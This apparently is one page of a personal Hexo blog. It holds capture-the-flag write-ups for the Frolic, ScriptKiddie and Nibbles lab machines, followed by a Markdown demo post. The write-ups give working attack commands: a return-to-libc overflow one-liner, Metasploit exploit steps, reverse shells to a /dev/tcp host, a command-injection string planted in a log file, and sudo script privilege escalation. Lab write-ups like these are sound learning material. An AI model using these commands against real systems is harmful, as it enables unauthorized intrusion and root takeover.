@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/page/4/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-Forlic" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/07/15/Forlic/" class="article-date">
+  <time class="dt-published" datetime="2022-07-15T09:34:32.000Z" itemprop="datePublished">2022-07-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/07/15/Forlic/">Forlic</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><img src="/2022/07/15/Forlic/nmap.png">
+
+<h5 id="port-exploration"><a href="#port-exploration" class="headerlink" title="port exploration"></a>port exploration</h5><p>9999: at 10.10.10.111:9999,it’s a simple nginx welcome page<br>445: smb is running on the 445,we can use common ways to find if there is something can be used </p>
+<pre><code> smbmap -H 10.10.10.111 
+</code></pre>
+<p>smbmap shows nothing we can use<br><img src="/2022/07/15/Forlic/smbmap.png" width="60%"></p>
+<pre><code> smbclient -N -L //10.10.10.111
+</code></pre>
+<p>and smbclient also shows nothing interesting<br><img src="/2022/07/15/Forlic/smbclient.png" width="60%"><br>1880: the 9999 port’s site gives us a url:<a target="_blank" rel="noopener" href="http://forlic.htb:1880/">http://forlic.htb:1880</a><br>it’s an admin web</p>
+<h5 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h5><p>we try dirsearch to all ports we find,and in 9999 there has some pages<br><img src="/2022/07/15/Forlic/dirsearch.png" width="60%"><br>10.10.10.111:9999&#x2F;test has a phpinfo page<br>10.10.10.111:9999&#x2F;backup has something useful<br>10.10.10.111:9999&#x2F;dev is forbidden<br>10.10.10.111:9999&#x2F;admin is an admin page<br><img src="/2022/07/15/Forlic/backup.png" width="60%"><br>we can use <code>curl 10.10.10.111:9999/backup/user.txt</code> and <code>curl 10.10.10.111:9999/backup/password.txt</code> to get admin and imnothuman</p>
+<h5 id="dirsearch-deeper"><a href="#dirsearch-deeper" class="headerlink" title="dirsearch deeper"></a>dirsearch deeper</h5><p>though the &#x2F;dev is forbidden,we use dirsearch http:10.10.10.111:9999&#x2F;dev to explore deeper<br>it has backup and test<br><img src="/2022/07/15/Forlic/dev.png" width="60%"><br>in the &#x2F;backup,it shows &#x2F;playsms<br>in the &#x2F;test,it provides a file name test<br>10.10.10.111:9999&#x2F;playsms is another login page</p>
+<h5 id="x2F-admin"><a href="#x2F-admin" class="headerlink" title="&#x2F;admin"></a>&#x2F;admin</h5><p>the &#x2F;admin loads a js hide the login information<br><img src="/2022/07/15/Forlic/admin.png" width="60%"><br>the username is admin and the password is superduperlooperpassword_lol<br>after entering it,we can see a brainfuck code,and to decode it<br><img src="/2022/07/15/Forlic/brainfuck.png" width="60%"><br><code>https://www.dcode.fr/ook-language</code><br><img src="/2022/07/15/Forlic/brainfuckdecode.png" width="60%"><br>it shows <code>Nothing here check /asdiSIAJJ0QWE9JAS</code><br>after visit it,it displays a new page encoded,after decoded,we get some message<br><img src="/2022/07/15/Forlic/b64.png" width="60%"><br>decode it,and it seems like a zip <code>curl -s http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ | base64 -d | xxd</code><br><img src="/2022/07/15/Forlic/zip.png" width="60%"><br><code>curl -s http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ | base64 -d &gt; index.php.zip</code><br>unzip it,it has a password<br>use fcrackzip to unpack it<br><code>fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt out.zip</code><br>The options are -u to force actual unzip, which weeds out tons of fps, -D for dictionary, and -p rockyou.txt to pass the wordlist.and the password&#x3D;password<br><img src="/2022/07/15/Forlic/index.png" width="60%"><br>Use xxd to read that back to bytes, which happens to be not only ASCII, but base64 characters <code>cat index.php | xxd -r -p</code><br><img src="/2022/07/15/Forlic/base64.png" width="60%"><br>decode it,and get the text<br><code>cat index.php | xxd -r -p | tr -d &#39;\r\n&#39; | base64 -d</code><br><img src="/2022/07/15/Forlic/brainfuck2.png" width="60%"><br>it’s brainfuck,decode at <code>https://copy.sh/brainfuck/</code> and get the phrase idkwhatispass</p>
+<h4 id="2-shell-as-web"><a href="#2-shell-as-web" class="headerlink" title="2.shell as web"></a>2.shell as web</h4><h5 id="now-we-have-two-password"><a href="#now-we-have-two-password" class="headerlink" title="now we have two password"></a>now we have two password</h5><p>1.admin&#x2F;superduperlooperpassword_lol 2.admin&#x2F;idkwhatispass<br>try it at &#x2F;admin &#x2F;playsms and final password2 worked on &#x2F;playsms</p>
+<h5 id="use-msfconsole"><a href="#use-msfconsole" class="headerlink" title="use msfconsole"></a>use msfconsole</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search playsms</span><br><span class="line">use 1</span><br><span class="line">set rhost 10.10.10.111</span><br><span class="line">set rport 9999</span><br><span class="line">set targeturi /playsms/index.php</span><br><span class="line">set lhost 10.10.14.15</span><br></pre></td></tr></table></figure>
+<p>then we get a webshell<br><img src="/2022/07/15/Forlic/webshell.png" width="60%"></p>
+<h4 id="3-shell-as-root"><a href="#3-shell-as-root" class="headerlink" title="3.shell as root"></a>3.shell as root</h4><p>first improve the shell</p>
+<pre><code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
+</code></pre>
+<img src="/2022/07/15/Forlic/ayush.png" width="60%">
+we can see some hide catelog in ayush's home
+the .binary has the suid,the rop in it is owned by root
+<img src="/2022/07/15/Forlic/root.png" width="60%">
+the rop's function is to get our input and output it
+<img src="/2022/07/15/Forlic/ropfunction.png" width="60%">
+we can first see what's configured
+
+<pre><code>cat /proc/sys/kernel/randomize_va_space
+</code></pre>
+<p>it shows no ASLR<br>because we stright open it can’t read it,so we use base64 to read<br>and save it to local machine and use <code>base64 -d rop_b64 &gt; rop</code> to restore it<br><img src="/2022/07/15/Forlic/rop.png" width="60%"><br>open it in gdb with <a target="_blank" rel="noopener" href="https://github.com/longld/peda">PEDA</a>, and run checksec<br><img src="/2022/07/15/Forlic/checksec.png" width="60%"><br>we can force the program to crash<br><img src="/2022/07/15/Forlic/crash.png" width="60%"></p>
+<h5 id="background"><a href="#background" class="headerlink" title="background"></a>background</h5><p>I can cause the program to crash by sending too much input which likely means I can overwrite the return address somewhere. Given that ASLR is disabled but DEP (NX) is enabled, the easiest attack path is to use Return to libc.</p>
+<h5 id="understand-return-to-libc"><a href="#understand-return-to-libc" class="headerlink" title="understand return to libc"></a>understand return to libc</h5><h6 id="1-stack"><a href="#1-stack" class="headerlink" title="1.stack"></a>1.stack</h6><p>The stack starts at high memory addresses, and builds up to lower memory addresses. Inside any given function, there’s a stack frame. The bottom of the stack frame is stored in the RBP (or EBP on x86) register. The top is stored in RSP (or ESP). For example (and I’ll use 32-bit registers in this example since Frolic is 32-bit):<br><img src="/2022/07/15/Forlic/1.jpg" width="60%"></p>
+<h6 id="2-function-call"><a href="#2-function-call" class="headerlink" title="2.function call"></a>2.function call</h6><p>When a function is called, the arguments are put onto the stack (either by adding space to the top or using the space already there). So, for example, the program comes to:<br><img src="/2022/07/15/Forlic/2.jpg" width="60%"><br>Just before the call, two addresses are stored in ESP and ESP+4. These are the addresses of the string to copy and the buffer to copy it to:<br><img src="/2022/07/15/Forlic/3.jpg" width="60%"><br>Now the call instruction is reached. It is going to push the next instruction to the top of the stack (as the return address), and then jump execution to the new function. The next function is going to start with some common stuff, known as the prologue:<br><img src="/2022/07/15/Forlic/4.jpg" width="60%"><br>So take that step by step. call pushes return address:<br><img src="/2022/07/15/Forlic/5.jpg" width="60%"><br>Now push ebp:<br><img src="/2022/07/15/Forlic/6.jpg" width="60%"><br>mov ebp, esp:<br><img src="/2022/07/15/Forlic/7.jpg" width="60%"><br>Finally sub esp, 0x100:<br><img src="/2022/07/15/Forlic/8.jpg" width="60%"></p>
+<h6 id="3-stack-return"><a href="#3-stack-return" class="headerlink" title="3. stack return"></a>3. stack return</h6><p>When a function is done, it will typically end with:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leave</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p><code>leave == mov esp, ebp + pop ebp</code><br>So the stack from before becomes:<br><img src="/2022/07/15/Forlic/9.jpg" width="60%"><br>Then when the return happens, the instruction pointer is popped, bringing that stack back to where it started:<br><img src="/2022/07/15/Forlic/10.jpg" width="60%"></p>
+<h6 id="4-What-Is-Return-to-libc"><a href="#4-What-Is-Return-to-libc" class="headerlink" title="4.What Is Return to libc"></a>4.What Is Return to libc</h6><p>A return to libc attack involves overwriting the return address in such a way that the computer jumps to the function I want. The standard case is the system function, with the argument &#x2F;bin&#x2F;sh, giving me a shell.</p>
+<p>If I were to call system(“&#x2F;bin&#x2F;sh”) normally, I would enter the function after the call but before the prologue with a stack like this:<br><img src="/2022/07/15/Forlic/11.jpg" width="60%"><br>The return address would be pushed onto the stack by the call instruction. But I’m not going to be going to system via a call, but rather a ret. So, I want the stack to look like this when I reach the return:<br><img src="/2022/07/15/Forlic/12.jpg" width="60%"><br>That way, ret will pop the system address into the instruction pointer, and the stack will look right. Since I don’t know the right return address, I’ll just use the function exit, so it cleanly exits when I’m done.</p>
+<h5 id="Find-the-Offset-to-EIP"><a href="#Find-the-Offset-to-EIP" class="headerlink" title="Find the Offset to EIP"></a>Find the Offset to EIP</h5><p>open the file with gbb-peda,and When the program crashes, I can take EIP and find out where that was in the pattern using pattern offset<br><img src="/2022/07/15/Forlic/eip.png" width="60%"><br>When the program crashes, I can take EIP and find out where that was in the pattern using pattern offset. I can use the ASCII or hex value:<br><img src="/2022/07/15/Forlic/AAGA.png" width="60%"><br>To double check that, I’ll send in a buffer of 52 As and then 4 Bs:<br><img src="/2022/07/15/Forlic/eip2.png" width="60%"><br>Crash, with EIP as BBBB.</p>
+<h5 id="Addresses"><a href="#Addresses" class="headerlink" title="Addresses"></a>Addresses</h5><p>Now I just need the addresses of <code>system</code>, <code>exit</code>, and <code>/bin/sh</code> in libc. This will vary on different hosts, so I’ll get the info with my shell on Frolic. First, I’ll get the base libc address with ldd,<br>Next, I’ll use <code>readelf -s</code> to get the offsets to various functions, and grep out <code>system</code> and <code>exit</code>,<br>Now I’ll use <code>strings -a -t x</code> to get the strings from libc with hex offsets, and grep for “&#x2F;bin&#x2F;sh”:<br><img src="/2022/07/15/Forlic/addresses.png" width="60%"><br>Now I can calculate the address for each of the three using any calculator (gdb here):<br><img src="/2022/07/15/Forlic/p.png" width="60%"></p>
+<h5 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h5><p>I can put that all together into this template: <code>&quot;A&quot; * 52 + SYSTEM + EXIT + /bin/sh</code>. I could write a python script to do this, but this case is simple enough that I can just do it as a one-liner. When I run that on Frolic, I’m root:<br><code>./rop $(python -c &#39;print(&quot;a&quot;*52 + &quot;\xa0\x3d\xe5\xb7&quot; + &quot;\xd0\x79\xe4\xb7&quot; + &quot;\x0b\x4a\xf7\xb7&quot;)&#39;)</code><br>now we finally get the flag<br><img src="/2022/07/15/Forlic/flag.png" width="60%"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/07/15/Forlic/" data-id="cl7edtt460004jtcp6ovpgrm9" data-title="Forlic" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Scriptkiddle" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/07/14/Scriptkiddle/" class="article-date">
+  <time class="dt-published" datetime="2022-07-15T03:07:06.000Z" itemprop="datePublished">2022-07-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/07/14/Scriptkiddle/">Scriptkiddle</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><p>nmap -sCV –min-rate&#x3D;10000 -p- 10.10.10.226<br><img src="/2022/07/14/Scriptkiddle/nmap.png" width="50%"></p>
+<h4 id="2-site"><a href="#2-site" class="headerlink" title="2.site"></a>2.site</h4><p>in the website,it has three parts<br>the first is nmap moudle,when we type a ip,it will send back the nmap result<br>the payload section allows me to generate a payload after choose ip,os and template file<br>the third part seems like searchspolit moudle</p>
+<h5 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h5><p>when we search msfvenom, we can see it has a exploit before the version 6.0.11<br><img src="/2022/07/14/Scriptkiddle/msfvenom.png" width="50%"><br>we can have a try<br>msfvenom handles an APK template file. The idea of the template file is that you can pass msfvenom a legit .exe or .apk, and it will try to build a malicious file into that file while preserving the intended capability. This functionality allows for attackers to hide behind the legit functionality.</p>
+<h5 id="build-payload"><a href="#build-payload" class="headerlink" title="build payload"></a>build payload</h5><p>we can use searchspolit -m 49491.py to use this<br>change the payload to <code>bash -c &#39;bash -i &gt;&amp;/dev/tcp/10.10.14.15/8888 0&gt;&amp;1&#39;</code> to reverse a shell<br>if the execution get wrong,first use <code>apt-get install openjdk-11-jdk-headless</code> to enable jarsigner<br>or we can use msfconsole to generate an apk,we should change the payload to <code>cmd/unix/reverse_netcat</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use msfconsole</span><br><span class="line">search msfvenom</span><br><span class="line">use 0</span><br><span class="line">set payload cmd/unix/reverse</span><br><span class="line">set lhost xxxx</span><br><span class="line">run</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="get-webshell"><a href="#get-webshell" class="headerlink" title="get webshell"></a>get webshell</h5><p>and we can upload the apk to the website<br>on the website “payloads” section, select Android for OS and upload the APK file that was generated by MetaSploit<br><img src="/2022/07/14/Scriptkiddle/web.png" width="50%"><br>in the &#x2F;home folder,we can find two users called kid and pwn<br><img src="/2022/07/14/Scriptkiddle/user.png" width="50%"><br>in the pwn’s folder,we can find a script called scanlosers.sh<br><img src="/2022/07/14/Scriptkiddle/scan.png" width="50%"><br>the script’s function is to scan ips written in &#x2F;home&#x2F;kid&#x2F;logs&#x2F;hackers<br>but this script doesn’t deal the input the hackers provides<br>so we can append a reverse shell command into the file<br><code>echo &quot;test ;/bin/bash -c &#39;bash -i &gt;&amp;/dev/tcp/10.10.14.15/8888 0&gt;&amp;1&#39; #”</code><br><img src="/2022/07/14/Scriptkiddle/pwnshell.png" width="50%"><br><img src="/2022/07/14/Scriptkiddle/pwnshell2.png" width="50%"></p>
+<h4 id="3-shell-as-root"><a href="#3-shell-as-root" class="headerlink" title="3.shell as root"></a>3.shell as root</h4><p>in the pwn,it can sudo msfconsole without password<br><img src="/2022/07/14/Scriptkiddle/root1.png" width="50%"><br>and we get the root<br><img src="/2022/07/14/Scriptkiddle/root2.png" width="50%"><br>we can exec command in msf or use <code>/bin/bash -i</code> to change to the root<br><img src="/2022/07/14/Scriptkiddle/root3.png" width="50%"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/07/14/Scriptkiddle/" data-id="cl7edtt4d000cjtcph2j4c8dw" data-title="Scriptkiddle" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Nibbles" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/07/14/Nibbles/" class="article-date">
+  <time class="dt-published" datetime="2022-07-14T10:10:31.000Z" itemprop="datePublished">2022-07-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/07/14/Nibbles/">Nibbles</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><p>nmap -sCV –min-rate&#x3D;10000 -p- 10.10.10.75<br><img src="/2022/07/14/Nibbles/nmap.png" width="50%"></p>
+<h4 id="2-site"><a href="#2-site" class="headerlink" title="2.site"></a>2.site</h4><h5 id="web"><a href="#web" class="headerlink" title="web"></a>web</h5><p>in the website,it just has hello world,but in the source code,it hides a hint<br><code>&lt;!-- /nibbleblog/ directory. Nothing interesting here! --&gt;</code><br>visit it</p>
+<h5 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h5><p>we use dirsearch to display its menu and we can find some pages that can visit<br><img src="/2022/07/14/Nibbles/dirsearch.png" width="50%"><br>when we visit some of them,we can get it’s machine menu<br>In exploring the resulting paths, &#x2F;nibbleblog&#x2F;content is interesting, and has dir lists enabled. Digging deeper, there’s a page at &#x2F;nibbleblog&#x2F;content&#x2F;private&#x2F;user.xml which reveals a user, admin, as well as the IPs that have tried to log in as it<br><img src="/2022/07/14/Nibbles/user.png" width="50%"></p>
+<h5 id="logging-into-admin"><a href="#logging-into-admin" class="headerlink" title="logging into admin"></a>logging into admin</h5><p>visit <a target="_blank" rel="noopener" href="http://10.10.10.75/nibbleblog/admin.php">http://10.10.10.75/nibbleblog/admin.php</a><br>we don’t have the creds,in most writeups says they guess the password or use the information get from  <a target="_blank" rel="noopener" href="http://10.10.10.75/nibbleblog/content/private/config.xml-admin-nibbles">http://10.10.10.75/nibbleblog/content/private/config.xml-admin-nibbles</a></p>
+<h5 id="Exploitaion"><a href="#Exploitaion" class="headerlink" title="Exploitaion"></a>Exploitaion</h5><p>in the settings page, we konw that the site is nibbleblog 4.0.3<br>we can use searchspolit to find some poc<br>it has a fileupload exploit<br>we use msf to get webshell<br><img src="/2022/07/14/Nibbles/msf.png" width="50%"><br>after this,we can get user.txt<br><img src="/2022/07/14/Nibbles/userflag.png" width="50%"></p>
+<h4 id="3-getting-root"><a href="#3-getting-root" class="headerlink" title="3.getting root"></a>3.getting root</h4><h5 id="first-get-a-fully-interactive-shell-using-the-python-pty-spawn-one-liner"><a href="#first-get-a-fully-interactive-shell-using-the-python-pty-spawn-one-liner" class="headerlink" title="first get a fully interactive shell using the python pty.spawn one liner"></a>first get a fully interactive shell using the python pty.spawn one liner</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+<img src="/2022/07/14/Nibbles/root1.png" width="50%">
+so we can try run monitor.sh and the color of text changed
+<img src="/2022/07/14/Nibbles/root2.png" width="50%">
+
+<p><a target="_blank" rel="noopener" href="https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d">sudo trick</a><br>from this article,we can learn that how to use sudo-enabled files to open system-level tools like &#x2F;bin&#x2F;bash.<br>If you have write and execute permissions to a file that runs with elevated privileges, you can add commands such as system calls to get what you want.<br>we can use the next command to get the root</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;#! /bin/bash&quot; &gt; monitor.sh</span><br><span class="line">echo &quot;/bin/bash -i&quot; &gt;&gt; monitor.sh</span><br><span class="line">sudo ./monitor.sh</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/07/14/Nibbles/" data-id="cl7edtt4b000ajtcper824mse" data-title="Nibbles" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-first-blog" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/07/13/first-blog/" class="article-date">
+  <time class="dt-published" datetime="2022-07-13T14:35:48.000Z" itemprop="datePublished">2022-07-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/07/13/first-blog/">first_blog</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="h1-标题"><a href="#h1-标题" class="headerlink" title="h1 标题"></a>h1 标题</h1><h2 id="h2-标题"><a href="#h2-标题" class="headerlink" title="h2 标题"></a>h2 标题</h2><h3 id="h3-标题"><a href="#h3-标题" class="headerlink" title="h3 标题"></a>h3 标题</h3><h4 id="h4-标题"><a href="#h4-标题" class="headerlink" title="h4 标题"></a>h4 标题</h4><h5 id="h5-标题"><a href="#h5-标题" class="headerlink" title="h5 标题"></a>h5 标题</h5><h6 id="h6-标题"><a href="#h6-标题" class="headerlink" title="h6 标题"></a>h6 标题</h6><h2 id="水平线"><a href="#水平线" class="headerlink" title="水平线"></a>水平线</h2><hr>
+<hr>
+<hr>
+<h2 id="文本样式"><a href="#文本样式" class="headerlink" title="文本样式"></a>文本样式</h2><p><strong>This is bold text</strong></p>
+<p><strong>This is bold text</strong></p>
+<p><em>This is italic text</em></p>
+<p><em>This is italic text</em></p>
+<p><del>Strikethrough</del></p>
+<h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><p>无序</p>
+<ul>
+<li>Create a list by starting a line with <code>+</code>, <code>-</code>, or <code>*</code></li>
+<li>Sub-lists are made by indenting 2 spaces:<ul>
+<li>Marker character change forces new list start:<ul>
+<li>Ac tristique libero volutpat at</li>
+</ul>
+<ul>
+<li>Facilisis in pretium nisl aliquet</li>
+</ul>
+<ul>
+<li>Nulla volutpat aliquam velit</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Very easy!</li>
+</ul>
+<p>有序</p>
+<ol>
+<li><p>Lorem ipsum dolor sit amet</p>
+</li>
+<li><p>Consectetur adipiscing elit</p>
+</li>
+<li><p>Integer molestie lorem at massa</p>
+</li>
+<li><p>You can use sequential numbers…</p>
+</li>
+<li><p>…or keep all the numbers as <code>1.</code></p>
+</li>
+</ol>
+<p>Start numbering with offset:</p>
+<ol start="57">
+<li>foo</li>
+<li>bar</li>
+</ol>
+<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>Inline <code>code</code></p>
+<p>Indented code</p>
+<pre><code>// Some comments
+line 1 of code
+line 2 of code
+line 3 of code
+</code></pre>
+<p>Block code “fences”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sample text here...</span><br></pre></td></tr></table></figure>
+
+<p>Syntax highlighting</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = <span class="keyword">function</span> (<span class="params">bar</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> bar++;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">foo</span>(<span class="number">5</span>));</span><br></pre></td></tr></table></figure>
+<p><img src="/creds.jpg" alt="creds"></p>
+<img src="/2022/07/13/first-blog/creds.jpg" class title="This is an image">
+
+<div align="center">
+<img src="/2022/07/13/first-blog/creds.jpg" width="40%" height="30%">
+</div>
+
+<div align="left">
+<img src="/2022/07/13/first-blog/creds.jpg" width="30%">
+</div>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/07/13/first-blog/" data-id="cl7edtt4f000fjtcpht0h6clq" data-title="first_blog" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/page/3/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/09/07/nineveh/">nineveh</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/06/haircut/">haircut</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/06/cronos/">cronos</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/06/bastard/">bastard</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/05/popcorn/">popcorn</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
